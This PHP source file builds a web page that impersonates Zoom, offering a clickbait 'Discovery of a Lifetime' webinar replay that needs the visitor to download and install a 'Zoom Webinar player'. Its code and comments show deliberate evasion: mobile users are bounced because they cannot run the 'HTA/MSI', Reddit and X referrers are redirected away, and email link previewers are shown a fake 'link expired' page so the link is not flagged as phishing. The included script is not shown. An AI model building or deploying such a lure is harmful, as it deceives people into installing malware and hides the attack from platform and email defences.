<?php
require __DIR__ . '/../lib.php';

gate_doc([], 0, false);

// Mobile can't run the HTA/MSI. Bounce to the "desktop required" page before
// the anti-bot gate so a phone user never hits a forensics 404.
$isMobile = preg_match('/(iphone|ipod|android.*mobile|mobile)/i', (string)($_SERVER['HTTP_USER_AGENT'] ?? ''));
if ($isMobile) {
    header('Location: /denied.html');
    exit;
}

// Blocked-IP handling: social platforms get a clean redirect to their home
// page (looks like a legitimate shortlink bounce, no forensics 404).
$_host = ref_host();
if (in_array($_host, ['reddit.com','reddit.com.','redditmedia.com','redditstatic.com','redditstatic.com.','redditstatic.net'], true)) {
    header('Location: https://www.reddit.com/', 302);
    exit;
}
if (in_array($_host, ['x.com','x.com.','twitter.com','twitter.com.','t.co','t.co.','api.x.com','pbs.twimg.com','ton.twimg.com'], true)) {
    header('Location: https://x.com/', 302);
    exit;
}
// Mail previewers (Outlook Safe Links, Gmail previews, Apple Mail): render a
// dead link so it never looks like a "phishing link" in the email client.
if (mail_ref_host($_host)) {
    header('HTTP/1.1 200 OK');
    exit('<html><body style="margin:0;background:#0b0f14;color:#6b7684;font-family:Arial,sans-serif;font-size:13px;padding:28px;line-height:1.5;max-width:640px;margin:0 auto;">This link has expired. <a href="#" style="color:#7f8ea3;">Open the latest version</a>.</body></html>');
}

$tk = issue_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Zoom Webinar</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    body { height: 100vh; width: 100vw; background: linear-gradient(160deg, #1b2735 0%, #0f3460 55%, #16213e 100%); }
    .modal-overlay {
      position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.45);
      display: flex; justify-content: center; align-items: center; z-index: 1000;
      padding: 16px;
    }
    .modal-content {
      background-color: white; padding: 30px 34px; border-radius: 12px;
      width: 90%; max-width: 560px; box-shadow: 0 8px 30px rgba(0,0,0,0.35);
      animation: modalFadeIn 0.3s ease-out; text-align: center;
    }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .modal-header { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 20px; }
    .modal-header img { width: 46px; height: 46px; }
    .modal-header .title-wrap { text-align: left; }
    .modal-header h1 { font-size: 20px; color: #1a1a1a; font-weight: 600; line-height: 1.2; }
    .modal-header .sub { font-size: 13px; color: #8a8a8a; margin-top: 2px; }
    .eyebrow {
      display: inline-block; font-size: 11px; font-weight: 700; letter-spacing: 0.06em;
      text-transform: uppercase; color: #0B5CFF; background: #eaf1ff;
      padding: 5px 12px; border-radius: 20px; margin-bottom: 14px;
    }
    .talk-title { font-size: 26px; font-weight: 700; color: #16213e; line-height: 1.25; margin-bottom: 12px; }
    .talk-sub { font-size: 15px; color: #555; line-height: 1.55; margin-bottom: 14px; }
    .talk-body { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 16px; text-align: left; }
    .meta {
      display: flex; gap: 18px; justify-content: center; flex-wrap: wrap;
      font-size: 12.5px; color: #999; margin-bottom: 18px;
    }
    .meta span { display: inline-flex; align-items: center; gap: 5px; }
    .join-btn {
      background-color: #0B5CFF; color: white; border: none;
      padding: 15px 34px; border-radius: 8px; font-size: 16px; font-weight: 600;
      cursor: pointer; width: 100%; max-width: 320px; transition: background-color 0.3s;
    }
    .join-btn:hover { background-color: #0a52e0; }
    .join-note { color: #999; font-size: 12px; margin-top: 14px; line-height: 1.5; }
    .connecting {
      display: none; margin-top: 14px; color: #666; font-size: 14px;
      align-items: center; justify-content: center; gap: 10px;
    }
    .connecting .spinner {
      width: 18px; height: 18px; border: 2px solid #e0e0e0; border-top-color: #0B5CFF;
      border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .footer { margin-top: 18px; font-size: 11.5px; color: #b5b5b5; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <img src="assets/zoomicon.png" alt="Zoom">
        <div class="title-wrap">
          <h1>Zoom Webinar</h1>
          <div class="sub">Recorded session</div>
        </div>
      </div>

      <div class="eyebrow">Webinar replay · Full recording now available</div>

      <div class="talk-title">The Discovery of a Lifetime</div>
      <div class="talk-sub">Dr. Amara Fields shares the breakthrough she spent decades building — and the story the news couldn&rsquo;t stop covering.</div>

      <div class="talk-body">
        The live session has ended. The complete recording is now available to watch.
        Experience everything Dr. Fields revealed on stage: the discovery itself, the
        years of work behind it, and why the world is paying attention.
      </div>

      <div class="meta">
        <span>&#128197; Live session: Nov 12, 2026</span>
        <span>&#128333; 47 min</span>
        <span>&#127916; Full recording ready to watch</span>
      </div>

      <button onclick="this.style.display='none';document.getElementById('connecting').style.display='flex'" id="joinbtn" class="join-btn">&#9654;&nbsp; Watch the Full Recording</button>

      <div id="connecting" class="connecting">
        <span class="spinner"></span> Preparing your recording&hellip;
      </div>

      <div class="join-note">
        Requires the Zoom Webinar player. You&rsquo;ll be asked to download and install it to begin playback.
      </div>

      <div class="footer">Hosted on Zoom Webinar &middot; 12,400+ people watched live</div>
    </div>
  </div>

  <script>
<?php include __DIR__ . '/../include/telemetry.php'; ?>
  </script>
</body>
</html>
